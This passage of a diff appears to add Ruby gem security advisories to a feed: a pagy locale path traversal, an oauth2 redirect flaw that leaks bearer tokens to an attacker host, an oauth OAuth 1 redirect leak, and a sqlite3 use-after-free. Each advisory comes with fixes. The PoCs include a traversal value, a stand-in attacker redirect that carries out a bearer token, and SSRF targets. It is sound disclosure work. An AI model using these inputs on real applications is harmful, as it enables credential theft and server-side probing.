+which file Pagy attempted to load.</p>
+<h3 id="details">Details</h3>
+<p>The setter stored the value as-is, and the loader joined it into a path
+and read it:</p>
+<pre><code class="language-ruby"># gem/lib/pagy/modules/i18n/i18n.rb
+def locale=(value)
+  Thread.current[:pagy_locale] = value.to_s
+end
+
+# ...later, when translating:
+path = pathnames.reverse.map { |p| p.join("#{locale}.yml") }.find(&amp;:exist?)
+dictionary = YAML.load_file(path)[locale]
+</code></pre>
+<p>Because the locale was used verbatim, a value such as an absolute path or
+a <code>../</code>-style string redirected the lookup outside the locales directory.
+Pagy's subsequent structural check (<code>dictionary['pagy']['p11n']</code>)
+prevents the file's contents from being returned, so this is <strong>not</strong> a
+direct file read.</p>
+<p>Fixed in 43.5.6 by constraining the locale to a BCP 47 shape before use:</p>
+<pre><code class="language-ruby">LOCALE_PATTERN = /\A[a-zA-Z]{2,8}(-[a-zA-Z0-9]{1,8})*\z/
+
+def locale=(value)
+  Thread.current[:pagy_locale] = value.to_s[LOCALE_PATTERN]
+end
+</code></pre>
+<p>Any non-matching value (including <code>nil</code>) resolves to the default locale
+and never reaches the file lookup.</p>
+<h3 id="poc">PoC</h3>
+<p>In an application that sets <code>Pagy::I18n.locale = params[:locale]</code>, the
+loader appends <code>.yml</code> and reads <code>&lt;locale&gt;.yml</code>, so the request param
+controls the target path. For example, pointing it at the app's
+<code>config/database.yml</code>:</p>
+<ol>
+<li>Send a request with <code>?locale=../../../config/database</code> (adjust the
+number of <code>../</code> to reach the app root from the gem's <code>locales/</code>
+directory).</li>
+<li>Pagy calls <code>YAML.load_file</code> on the resulting <code>…/config/database.yml</code>.</li>
+<li>The outcome differs by whether that <code>.yml</code> exists, is readable, parses
+as YAML, and has Pagy's expected structure — an existing, readable
+<code>config/database.yml</code> raises a different error than a non-existent
+path (which silently falls back to the default locale). This yields a
+file-existence / readability oracle for <code>.yml</code> paths, and the targeted
+file is read into the process during the attempt.</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Information disclosure (CWE-22 / CWE-200): a file-existence / readability
+oracle for <code>.yml</code> paths on the host, plus a server-side read of
+attacker-chosen files into the process. The file contents are not
+returned in the response.</p>
+<p>Only applications that pass <strong>unsanitized end-user input</strong> into
+<code>Pagy::I18n.locale=</code> are affected. Applications that set the locale from
+trusted values are not affected.</p>
+<p><strong>Patched:</strong> pagy 43.5.6.
+<strong>Workaround (if you cannot upgrade):</strong> validate the locale before
+assigning it, e.g.
+<code>Pagy::I18n.locale = params[:locale].to_s[/\A[a-zA-Z]{2,8}(-[a-zA-Z0-9]{1,8})*\z/]</code>,
+or restrict it to your known set of locales.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ddnexus/pagy/security/advisories/GHSA-2xmw-f8j8-wfxc">https://github.com/ddnexus/pagy/security/advisories/GHSA-2xmw-f8j8-wfxc</a></li>
+<li><a href="https://github.com/ddnexus/pagy/pull/908">https://github.com/ddnexus/pagy/pull/908</a></li>
+<li><a href="https://github.com/ddnexus/pagy/commit/efcf09690e9fa7d7abdfb987b785a55f87e287df">https://github.com/ddnexus/pagy/commit/efcf09690e9fa7d7abdfb987b785a55f87e287df</a></li>
+<li><a href="https://github.com/ddnexus/pagy/releases/tag/43.5.6">https://github.com/ddnexus/pagy/releases/tag/43.5.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-2xmw-f8j8-wfxc">https://github.com/advisories/GHSA-2xmw-f8j8-wfxc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2xmw-f8j8-wfxc</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-28T22:25:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[oauth2] OAuth2::Client#request: Protocol-relative redirect Location overrides authority, leaking bearer Authorization to attacker host]]></title>
+        <id>https://github.com/advisories/GHSA-pp92-crg2-gfv9</id>
+        <link href="https://github.com/advisories/GHSA-pp92-crg2-gfv9"/>
+        <updated>2026-07-28T16:32:45.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>When an application uses <code>OAuth2::Client</code> (typically via an <code>OAuth2::AccessToken</code>) and the configured authorization server returns a redirect whose <code>Location</code> header is a protocol-relative URI of the form <code>//attacker.example/leak</code>, <code>OAuth2::Client#request</code> resolves the redirect with <code>response.response.env.url.merge(location)</code>. Per RFC 3986 §5.2, an input that starts with <code>//</code> is a network-path reference and replaces the authority of the base URL: <code>URI("http://idp.trusted/userinfo").merge("//attacker.example/leak")</code> returns <code>http://attacker.example/leak</code>. The recursive <code>request(verb, full_location, req_opts)</code> call then re-sends the request to the attacker host while preserving the <code>Authorization: Bearer &lt;access-token&gt;</code> header that <code>OAuth2::AccessToken#configure_authentication!</code> installed on <code>req_opts[:headers]</code> for the original request.</p>
+<p>The result is a one-shot cross-origin credential disclosure: any 30x response from the IdP that an attacker can influence (a compromised endpoint, a tenant-controlled IdP in a multi-tenant deployment, or an open-redirect handler that does not normalise the <code>Location</code> it emits) can extract the bearer access token of the calling user.</p>
+<h2 id="affected">Affected</h2>
+<ul>
+<li><code>oauth2</code> v2.0.21 and all prior versions back to and including v0.4.0.<ul>
+<li>The underlying unsafe redirect-following behavior that reuses headers starts in v0.4.0 via <a href="https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73">https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73</a></li>
+<li>The vulnerability was retained when the code was refactored to a redirect helper, and in this form has been present in <code>OAuth2::Client#request</code> since v2.0.0 via <a href="https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73">https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73</a></li>
+</ul>
+</li>
+<li>Ruby 4.0.5 on <code>arm64-darwin25</code>. The behaviour of <code>URI#merge</code> for protocol-relative inputs is RFC-conformant and the same on every supported Ruby (≥ 2.x).</li>
+<li>Adapter independence: confirmed against the default <code>faraday</code> 2.14.2 + <code>faraday-net_http</code> 3.4.3 stack. The <code>URI#merge</code> call is in <code>oauth2</code> itself, not in Faraday, so the issue is not adapter-specific.</li>
+</ul>
+<h2 id="impact">Impact</h2>
+<p>A consumer that uses <code>OAuth2::AccessToken#get</code> / <code>#post</code> / <code>#request</code> against an IdP whose redirect target an attacker can influence (open redirect, malicious tenant, or in-path adversary) loses two things at once:</p>
+<ol>
+<li><strong>Cross-origin credential disclosure.</strong> The connection-scoped <code>Authorization: Bearer &lt;token&gt;</code> header attached by <code>OAuth2::AccessToken#configure_authentication!</code> is sent to the attacker host on the very next request, with no second user interaction.</li>
+<li><strong>SSRF from the application server.</strong> The OAuth2 client follows the redirect on behalf of the application, so the host that ultimately receives the request is one the attacker chooses — useful for hitting internal addresses (<code>//169.254.169.254/...</code>, <code>//127.0.0.1:.../...</code>) that the application server can reach but the attacker cannot.</li>
+</ol>
+<p>The combined primitive is stronger than the usual cross-origin-redirect leak because no application-level cooperation is required and no <code>Location: http://attacker/...</code> is needed — the protocol-relative <code>//attacker/x</code> form slips past naive scheme-based Location filters that allow same-scheme-implicit redirects.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><a href="https://github.com/ruby-oauth/oauth2/blob/e2d509705db6091c8d5f27c31e29c58e39e51c7c/lib/oauth2/client.rb#L146-L182"><code>lib/oauth2/client.rb#L146-L182</code></a> at commit <code>e2d509705db6091c8d5f27c31e29c58e39e51c7c</code> (tag <code>v2.0.20</code>):</p>
+<pre><code class="language-ruby">def request(verb, url, req_opts = {}, &amp;block)
+  response = execute_request(verb, url, req_opts, &amp;block)
+  status = response.status
+
+  case status
+  when 301, 302, 303, 307
+    req_opts[:redirect_count] ||= 0
+    req_opts[:redirect_count] += 1
+    return response if req_opts[:redirect_count] &gt; options[:max_redirects]
+
+    if status == 303
+      verb = :get
+      req_opts.delete(:body)
+    end
+    location = response.headers["location"]
+    if location
+      full_location = response.response.env.url.merge(location)  # &lt;-- protocol-relative input replaces authority
+      request(verb, full_location, req_opts)
+    # ...
+</code></pre>
+<p><code>response.response.env.url</code> is the resolved URL of the prior request (always absolute, since Faraday's <code>build_exclusive_url</code> produces an absolute URI). <code>location</code> is the raw <code>Location</code> response header, with no validation. <code>URI#merge</code> follows RFC 3986 §5.2 and treats <code>//host/path</code> as a network-path reference, dropping the base authority and adopting the input's host. The recursive <code>request(verb, full_location, req_opts)</code> then re-enters with <code>req_opts</code> unchanged, which means any <code>Authorization</code> header that <code>OAuth2::AccessToken#configure_authentication!</code> placed in <code>req_opts[:headers]</code> for the original request travels with the redirected request to the attacker-controlled host.</p>
+<p>The credential plumbing is at <a href="https://github.com/ruby-oauth/oauth2/blob/e2d509705db6091c8d5f27c31e29c58e39e51c7c/lib/oauth2/access_token.rb#L376-L408"><code>lib/oauth2/access_token.rb#L376-L408</code></a>:</p>
+<pre><code class="language-ruby">def configure_authentication!(opts, verb)
+  # ...
+  case mode
+  when :header
+    opts[:headers] ||= {}
+    opts[:headers].merge!(headers)
+  # ...
+end
+
+def headers
+  {"Authorization" =&gt; options[:header_format] % token}
+end
+</code></pre>
+<p>The default token mode is <code>:header</code>, so every <code>AccessToken#get</code> / <code>#post</code> / <code>#request</code> call attaches <code>Authorization: Bearer &lt;token&gt;</code> to <code>req_opts[:headers]</code>. That same dictionary is then forwarded verbatim into the redirected request, because <code>Client#request</code> does not inspect or strip <code>req_opts[:headers]</code> when the redirect crosses origins.</p>
+<h2 id="reachable-in-production">Reachable in production</h2>
+<p>The vulnerable path is the documented <code>AccessToken#get</code> / <code>AccessToken#post</code> flow that every <code>oauth2</code> integration uses to call a resource server after the token exchange. The redirect handler is enabled unconditionally for status codes 301, 302, 303, and 307, up to <code>options[:max_redirects]</code> hops (default 5). No opt-in flag is required: a single 302 response with a protocol-relative <code>Location</code> header is enough to redirect the next request to an attacker host with the bearer token attached.</p>
+<p>Realistic upstream triggers:</p>
+<ol>
+<li><strong>Open redirect on the IdP.</strong> Many authorization servers expose endpoints that emit <code>Location</code> based on user input (for example logout flows, <code>redirect_uri</code> echoes, branded splash pages). When that endpoint does not normalise the user-supplied target, an attacker can plant <code>//attacker.example/leak</code> as the redirect target and induce the oauth2 client to follow it.</li>
+<li><strong>Tenant-controlled IdP.</strong> Multi-tenant SaaS where each tenant configures its own OIDC issuer URL via <code>OAuth2::Client.new(... , site: tenant_supplied_url)</code> allows a malicious tenant to set <code>site:</code> to its own server and emit the protocol-relative <code>Location</code> directly.</li>
+<li><strong>Compromised or downgraded IdP.</strong> A network-position adversary capable of altering a single response header before TLS termination (for example via a proxy that legitimately rewrites Location headers) can craft the protocol-relative form.</li>
+</ol>
+<p>In all three cases the access token is sent to the attacker host on the very next request: there is no second-hop redirect chain, no second user interaction, and no opportunity for the application to inspect the redirect target.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>The issue can be reproduced with a client using the default bearer-token header mode against an <code>oauth2</code> version before <code>2.0.22</code>.</p>
+<p>Minimal setup:</p>
+<pre><code class="language-ruby">require "oauth2"
+
+client = OAuth2::Client.new(
+  "client-id",
+  "client-secret",
+  site: "http://idp.example.test"
+)
+
+token = OAuth2::AccessToken.new(client, "SECRET-BEARER-TOKEN")
+token.get("/userinfo")
+</code></pre>
+<p>If the configured authorization/resource server responds to that request with a redirect such as:</p>
+<pre><code class="language-http">HTTP/1.1 302 Found
+Location: //attacker.example.test/leak
+Content-Length: 0
+</code></pre>
+<p>then vulnerable versions resolve the protocol-relative <code>Location</code> as a cross-origin URL and recursively issue the follow-up request while preserving the original request headers. Because <code>OAuth2::AccessToken</code> uses <code>Authorization: Bearer &lt;token&gt;</code> by default, the next request is sent to the attacker-controlled host with the bearer token attached:</p>
+<pre><code class="language-http">GET /leak HTTP/1.1
+Host: attacker.example.test
+Authorization: Bearer SECRET-BEARER-TOKEN
+</code></pre>
+<p>This requires no special Faraday adapter behavior. The vulnerable redirect handling is in <code>OAuth2::Client#request</code>; the attacker-controlled input is the raw <code>Location</code> header value from a 30x response.</p>
+<h3 id="patched-build-verification">Patched-build verification</h3>
+<p>Monkey-patch <code>OAuth2::Client#request</code> so that protocol-relative <code>Location</code> values are forced down the relative-path branch of <code>URI#merge</code> by prepending <code>./</code>. Re-run the attack against the same <code>poc_collector.rb</code> instance.</p>
+<pre><code class="language-ruby">module OAuth2
+  class Client
+    def request(verb, url, req_opts = {}, &amp;block)
+      response = execute_request(verb, url, req_opts, &amp;block)
+      status = response.status
+      case status
+      when 301, 302, 303, 307
+        req_opts[:redirect_count] ||= 0
+        req_opts[:redirect_count] += 1
+        return response if req_opts[:redirect_count] &gt; options[:max_redirects]
+        verb = :get and req_opts.delete(:body) if status == 303
+        location = response.headers["location"]
+        if location
+          # PATCH: neutralise protocol-relative location before URI#merge.
+          safe_location = location.start_with?("//") ? "./#{location}" : location
+          full_location = response.response.env.url.merge(safe_location)
+          request(verb, full_location, req_opts)
+        else
+          raise(Error.new(response), "Got #{status} status code, but no Location header was present")
+        end
+      # ... unchanged fallthrough ...
+      end
+    end
+  end
+end
+</code></pre>
+<p>After applying the patch, the same <code>token.get("/userinfo")</code> call resolves the attack <code>Location: //127.0.0.1:4568/leak</code> to <code>http://127.0.0.1:4567/127.0.0.1:4568/leak</code> — same host as the IdP — and <code>:4568</code> never receives the bearer token. The IdP redirect loop trips <code>max_redirects</code> and the helper returns <code>status: 302</code> to the caller with no off-host request. Collector log after the patched run shows <code>:4568</code> LEAK count unchanged from the negative control:</p>
+<pre><code class="language-text">[idp:4567] hit  req_line=GET /userinfo HTTP/1.1  auth="Bearer SECRET-BEARER-XYZZY"
+[idp:4567] hit  req_line=GET ///127.0.0.1:4568/leak HTTP/1.1  auth="Bearer SECRET-BEARER-XYZZY"
+[idp:4567] hit  req_line=GET ///127.0.0.1:4568///127.0.0.1:4568/leak HTTP/1.1  auth="Bearer SECRET-BEARER-XYZZY"
+</code></pre>
+<p>All hops stay on <code>127.0.0.1:4567</code>. The bearer token never leaves the IdP.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Treat protocol-relative <code>Location</code> values as relative paths when resolving against the prior request URL. The smallest local fix is the <code>./</code> prefix used in <code>Faraday::Connection#build_exclusive_url</code> for the same primitive (see lines 485-488 of <code>faraday/lib/faraday/connection.rb</code>):</p>
+<pre><code class="language-ruby">location = response.headers["location"]
+if location
+  # Force protocol-relative inputs to be interpreted as relative paths so they
+  # cannot override the base authority via RFC 3986 §5.2 network-path reference.
+  safe_location = location.respond_to?(:start_with?) &amp;&amp; location.start_with?("//") \
+    ? "./#{location}" : location
+  full_location = response.response.env.url.merge(safe_location)
+  request(verb, full_location, req_opts)
+</code></pre>
+<p>A defence-in-depth follow-up is to also strip credential-bearing headers (<code>Authorization</code>, plus any custom headers configured via <code>header_format</code>) from <code>req_opts[:headers]</code> when the resolved host changes across the redirect, which mirrors how Mechanize handles cross-host redirects in <code>lib/mechanize/http/agent.rb#L1068-L1077</code>. That additional check protects against the orthogonal case where an attacker controls an absolute <code>Location: http://attacker.example/...</code> value on a same-host open-redirect endpoint.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ruby-oauth/oauth2/security/advisories/GHSA-pp92-crg2-gfv9">https://github.com/ruby-oauth/oauth2/security/advisories/GHSA-pp92-crg2-gfv9</a></li>
+<li><a href="https://github.com/ruby-oauth/oauth2/commit/0f0a474f1b38453e119e660c2daca742d4378ce9">https://github.com/ruby-oauth/oauth2/commit/0f0a474f1b38453e119e660c2daca742d4378ce9</a></li>
+<li><a href="https://github.com/ruby-oauth/oauth2/releases/tag/v2.0.22">https://github.com/ruby-oauth/oauth2/releases/tag/v2.0.22</a></li>
+<li><a href="https://github.com/advisories/GHSA-pp92-crg2-gfv9">https://github.com/advisories/GHSA-pp92-crg2-gfv9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pp92-crg2-gfv9</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-28T16:32:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[oauth] OAuth: Cross-origin token-request redirects can expose signed request metadata]]></title>
+        <id>https://github.com/advisories/GHSA-prq8-7wvh-44qh</id>
+        <link href="https://github.com/advisories/GHSA-prq8-7wvh-44qh"/>
+        <updated>2026-07-28T16:27:14.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="cross-origin-oauth-token-request-redirects-can-expose-signed-request-metadata">Cross-origin OAuth token-request redirects can expose signed request metadata</h1>
+<h2 id="summary">Summary</h2>
+<p>When an application uses <code>OAuth::Consumer</code> to request OAuth 1.0 request tokens or
+access tokens, the token request helper follows <code>300..399</code> redirects returned by
+the OAuth server. In affected versions, <code>OAuth::Consumer#token_request</code> parses the
+raw <code>Location</code> header, follows the redirect recursively, and can mutate the
+consumer's configured <code>site</code> when the redirect points to a different host with
+the same path.</p>
+<p>The result is a cross-origin signed-request disclosure primitive: if an OAuth
+server token endpoint returns a redirect whose target an attacker controls, the
+client can re-sign the token request and send OAuth 1.0 request metadata,
+including the OAuth signature, nonce, timestamp, consumer key, and any request
+parameters included in the signature base string, to the attacker-controlled
+host. The same behavior can also be used as an SSRF or confused-deputy primitive
+because the application server follows the redirect and sends the next request
+from its own network position.</p>
+<h2 id="affected">Affected</h2>
+<ul>
+<li><code>oauth</code> v1.1.5 and prior versions back to and including v0.5.5.<ul>
+<li>The cross-host token redirect behavior was introduced by
+<a href="https://github.com/ruby-oauth/oauth/commit/d74b767f">https://github.com/ruby-oauth/oauth/commit/d74b767f</a></li>
+<li>The behavior is documented in the v0.5.5 changelog as "Allow redirect to
+different host but same path".</li>
+</ul>
+</li>
+<li>The vulnerable behavior is in <code>OAuth::Consumer#token_request</code>, which is used by
+the documented request-token and access-token flows.</li>
+<li>The issue is not specific to a Ruby engine or platform. It is caused by the
+gem's redirect handling and recursive token request behavior.</li>
+</ul>
+<p>Patched version: <code>oauth</code> v1.1.6.</p>
+<h2 id="impact">Impact</h2>
+<p>A consumer that calls <code>OAuth::Consumer#get_request_token</code>,
+<code>OAuth::Consumer#get_access_token</code>, or lower-level token request helpers against
+an OAuth server whose token endpoint redirect target can be influenced may lose
+three security properties:</p>
+<ol>
+<li><strong>Cross-origin signed-request metadata disclosure.</strong> The redirected request is
+signed for the attacker-controlled endpoint. Depending on the request method,
+scheme, and parameters, the attacker may receive OAuth 1.0 parameters such as
+<code>oauth_consumer_key</code>, <code>oauth_signature_method</code>, <code>oauth_timestamp</code>,
+<code>oauth_nonce</code>, <code>oauth_version</code>, and <code>oauth_signature</code>.</li>
+<li><strong>SSRF from the application server.</strong> The OAuth client follows the redirect on
+behalf of the application, so the redirected host is contacted from the
+application server's network position.</li>
+<li><strong>Confused-deputy behavior.</strong> A malicious or compromised token endpoint can
+cause an otherwise trusted application to initiate signed requests to an
+unintended origin.</li>
+</ol>
+<p>The disclosed OAuth 1 signature is not equivalent to an OAuth 2 bearer token: it
+is bound to the signed request, timestamp, nonce, HTTP method, and request URL.
+However, it can still disclose sensitive integration metadata, may be replayable
+within the receiver's accepted nonce/timestamp window in some deployments, and
+can expose application-server reachability to attacker-selected hosts.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><a href="https://github.com/ruby-oauth/oauth/blob/v1.1.5/lib/oauth/consumer.rb"><code>lib/oauth/consumer.rb</code></a>
+at tag <code>v1.1.5</code>:</p>
+<pre><code class="language-ruby">def token_request(http_method, path, token = nil, request_options = {}, *arguments)
+  request_options[:token_request] ||= true
+  response = request(http_method, path, token, request_options, *arguments)
+  case response.code.to_i
+
+  when (200..299)
+    # parse token response
+  when (300..399)
+    # Parse redirect to follow
+    uri = URI.parse(response["location"])
+    our_uri = URI.parse(site)
+
+    # Guard against infinite redirects
+    response.error! if uri.path == path &amp;&amp; our_uri.host == uri.host
+
+    if uri.path == path &amp;&amp; our_uri.host != uri.host
+      options[:site] = "#{uri.scheme}://#{uri.host}"
+      @http = create_http
+    end
+
+    token_request(http_method, uri.path, token, request_options, arguments)
+  when (400..499)
+    raise OAuth::Unauthorized, response
+  else
+    response.error!
+  end
+end
+</code></pre>
+<p>The vulnerable behavior has several parts:</p>
+<ul>
+<li><code>response["location"]</code> is trusted as the next token request target.</li>
+<li>Redirects are followed for every <code>300..399</code> response.</li>
+<li>There is no general redirect counter or maximum redirect limit.</li>
+<li>Cross-host redirects with the same path can mutate <code>options[:site]</code> and rebuild
+the underlying HTTP client.</li>
+<li>The recursive call continues the token request flow and signs the next request
+for the redirected destination.</li>
+</ul>
+<h2 id="reachable-in-production">Reachable in production</h2>
+<p>The vulnerable path is reachable through the normal OAuth 1 token exchange:</p>
+<pre><code class="language-ruby">consumer = OAuth::Consumer.new(
+  consumer_key,
+  consumer_secret,
+  site: "https://provider.example"
+)
+
+request_token = consumer.get_request_token
+</code></pre>
+<p>If <code>https://provider.example/oauth/request_token</code> returns a redirect to an
+attacker-controlled host, the library follows that redirect as part of the token
+request flow. A realistic trigger is an OAuth provider, gateway, or reverse proxy
+that emits <code>Location</code> based on user-controlled or tenant-controlled input, or a
+malicious tenant-controlled OAuth endpoint in a multi-tenant integration.</p>
+<p>No application-level redirect handling is required. The redirect is followed
+inside the gem before the application receives the token response.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>A vulnerable application is one that uses <code>OAuth::Consumer</code> to perform an OAuth
+1 token exchange against a token endpoint that can be made to return a redirect
+to another origin.</p>
+<p>Example shape:</p>
+<pre><code class="language-ruby">consumer = OAuth::Consumer.new(
+  consumer_key,
+  consumer_secret,
+  site: "https://provider.example"
+)
+
+consumer.get_request_token
+</code></pre>
+<p>If <code>https://provider.example/oauth/request_token</code> responds with a <code>30x</code> redirect
+whose <code>Location</code> points to <code>https://attacker.example/...</code>, affected versions may
+follow that redirect as part of the token request flow. The redirected request is
+then generated and signed by the application server for the new destination.
+Depending on the configured OAuth request scheme, OAuth 1 parameters may be sent
+in the <code>Authorization</code> header, request body, or query string.</p>
+<p>Expected vulnerable behavior:</p>
+<ul>
+<li>the token request leaves the configured OAuth provider origin;</li>
+<li>the redirected host receives a signed OAuth 1 token request;</li>
+<li>the application does not get a chance to inspect or approve the redirect target
+before the redirected request is sent.</li>
+</ul>
+<p>Expected patched behavior:</p>
+<ul>
+<li>same-origin redirects continue to work, subject to a redirect limit;</li>
+<li>cross-origin token endpoint redirects are rejected by default;</li>
+<li>applications that intentionally require cross-origin token redirects must opt
+in explicitly with <code>token_request_cross_origin_redirects</code>.</li>
+</ul>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Reject cross-origin token endpoint redirects by default and require explicit
+opt-in for integrations that intentionally depend on that behavior.</p>
+<p>The fix released in v1.1.6 does the following:</p>
+<pre><code class="language-ruby">current_uri = token_request_uri(path)
+redirected_uri = token_request_redirect_uri(current_uri, response)
+response.error! unless redirected_uri
+
+redirect_count = request_options[:token_request_redirect_count].to_i + 1
+response.error! if redirect_count &gt; token_request_max_redirects(request_options)
+response.error! if token_request_cross_origin?(current_uri, redirected_uri) &amp;&amp;
+  !token_request_cross_origin_redirects?(request_options)
+
+redirect_options = request_options.merge(token_request_redirect_count: redirect_count)
+token_request(http_method, token_request_redirect_path(current_uri, redirected_uri), token, redirect_options, *arguments, &amp;block)
+</code></pre>
+<p>The fix intentionally preserves same-origin redirect compatibility while making
+cross-origin token endpoint redirects an explicit choice. It also avoids placing
+internal redirect state in <code>request_options</code> passed to OAuth signing.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Until a patched release is available, applications can reduce exposure by doing
+one or more of the following:</p>
+<ul>
+<li>Ensure configured OAuth token endpoints are fixed absolute URLs controlled by a
+trusted provider.</li>
+<li>Do not use tenant-controlled OAuth token endpoint URLs unless the tenant is
+trusted to receive signed OAuth token requests.</li>
+<li>Block outbound application-server traffic to internal metadata services and
+other sensitive internal addresses at the network layer.</li>
+<li>Place a trusted proxy in front of OAuth providers that rejects token endpoint
+redirects to a different origin.</li>
+</ul>
+<p>These mitigations reduce exploitability but do not remove the vulnerable redirect
+logic from the gem.</p>
+<h2 id="credit">Credit</h2>
+<p>Found during the follow-up audit for <code>GHSA-pp92-crg2-gfv9</code>.</p>
+<p>Reporter/coordinator: Peter H. Boling (<code>pboling</code>).</p>
+<h2 id="references">References</h2>
+<ul>
+<li>Related OAuth 2 advisory: <a href="https://github.com/ruby-oauth/oauth2/security/advisories/GHSA-pp92-crg2-gfv9">https://github.com/ruby-oauth/oauth2/security/advisories/GHSA-pp92-crg2-gfv9</a></li>
+<li>Fixed version: <code>oauth</code> v1.1.6</li>
+<li>Behavior-introducing commit: <a href="https://github.com/ruby-oauth/oauth/commit/d74b767f">https://github.com/ruby-oauth/oauth/commit/d74b767f</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/ruby-oauth/oauth/security/advisories/GHSA-prq8-7wvh-44qh">https://github.com/ruby-oauth/oauth/security/advisories/GHSA-prq8-7wvh-44qh</a></li>
+<li><a href="https://github.com/ruby-oauth/oauth/commit/d069dc8c4c9631947451215f07460d6cdf0caf3f">https://github.com/ruby-oauth/oauth/commit/d069dc8c4c9631947451215f07460d6cdf0caf3f</a></li>
+<li><a href="https://github.com/ruby-oauth/oauth/releases/tag/v1.1.6">https://github.com/ruby-oauth/oauth/releases/tag/v1.1.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-prq8-7wvh-44qh">https://github.com/advisories/GHSA-prq8-7wvh-44qh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-prq8-7wvh-44qh</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-28T16:27:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sqlite3] sqlite3-ruby has Use-After-Free in SQLite Aggregate Function Callbacks]]></title>
+        <id>https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</id>
+        <link href="https://github.com/advisories/GHSA-j7fr-3v8c-3qc3"/>
+        <updated>2026-07-28T16:23:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Using <code>Database#create_aggregate</code>, <code>#create_aggregate_handler</code>, or <code>Database#define_aggregator</code> to define an aggregate function, and then using an open statement calling that function after the database has been explicitly closed will result in an invalid memory read and a segmentation fault.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to sqlite3 gem v2.9.5 or later.</p>
+<p>As a workaround, avoid using an aggregate function after closing the database.</p>
+<h2 id="severity">Severity</h2>
+<p>The sqlite3-ruby maintainers assess this as Low severity. It is reliably triggered after GC when code is structured in a particular way. There is no known general exploit that could be used as a denial of service attack.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-j7fr-3v8c-3qc3">https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-j7fr-3v8c-3qc3</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/pull/711">https://github.com/sparklemotion/sqlite3-ruby/pull/711</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/commit/b24e1e6076528b7f95f99acf7a81c70d0004c726">https://github.com/sparklemotion/sqlite3-ruby/commit/b24e1e6076528b7f95f99acf7a81c70d0004c726</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54620.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54620.yml</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5">https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54620">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54620</a></li>
+<li><a href="https://github.com/advisories/GHSA-j7fr-3v8c-3qc3">https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-28T16:23:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sqlite3-ruby] sqlite3-ruby has Use-After-Free in SQLite Aggregate Function Callbacks]]></title>
+        <id>https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</id>
+        <link href="https://github.com/advisories/GHSA-j7fr-3v8c-3qc3"/>
+        <updated>2026-07-28T16:23:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Using <code>Database#create_aggregate</code>, <code>#create_aggregate_handler</code>, or <code>Database#define_aggregator</code> to define an aggregate function, and then using an open statement calling that function after the database has been explicitly closed will result in an invalid memory read and a segmentation fault.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to sqlite3 gem v2.9.5 or later.</p>
+<p>As a workaround, avoid using an aggregate function after closing the database.</p>
+<h2 id="severity">Severity</h2>
+<p>The sqlite3-ruby maintainers assess this as Low severity. It is reliably triggered after GC when code is structured in a particular way. There is no known general exploit that could be used as a denial of service attack.</p>
+<h3 id="references">References</h3>
+<ul>
